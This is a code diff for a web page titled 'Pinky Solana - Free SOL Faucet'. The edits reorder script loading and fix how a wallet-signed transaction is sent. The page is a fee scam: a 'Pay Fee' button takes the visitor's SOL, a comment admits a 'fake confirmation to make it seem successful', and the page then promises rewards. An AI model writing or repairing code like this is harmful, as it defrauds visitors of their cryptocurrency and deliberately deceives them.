@@ -4,13 +4,11 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Pinky Solana - Free SOL Faucet</title>
-    <!-- Add Buffer polyfill FIRST -->
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.70.1/lib/index.iife.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/index.min.js"></script>
     <script>
-        // Initialize Buffer globally
-        window.Buffer = window.Buffer || buffer.Buffer;
+        window.Buffer = buffer.Buffer; // Make Buffer available globally
     </script>
-    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.70.1/lib/index.iife.min.js"></script>
     <style>
         :root {
             --sol-purple: #9945FF;
@@ -316,7 +314,7 @@
             updateButtonStates();
         }
         
-        // Pay Fee (FIXED with Buffer polyfill)
+        // Pay Fee
         payFeeBtn.addEventListener('click', async () => {
             try {
                 showError('');
@@ -332,10 +330,8 @@
                 const { blockhash } = await connection.getRecentBlockhash();
                 transaction.recentBlockhash = blockhash;
                 
-                // FIX: Use wallet.signTransaction with proper transaction handling
                 const signed = await wallet.signTransaction(transaction);
-                const rawTransaction = signed.serialize();
-                const signature = await connection.sendRawTransaction(rawTransaction);
+                const signature = await connection.sendRawTransaction(signed.serialize());
                 
                 // Fake confirmation to make it seem successful
                 await new Promise(resolve => setTimeout(resolve, 2000));
@@ -349,7 +345,6 @@
                 showSuccess('Activation fee paid! You can now claim your SOL rewards.');
             } catch (error) {
                 showError('Payment failed: ' + error.message);
-                console.error('Payment error:', error);
             }
         });
         
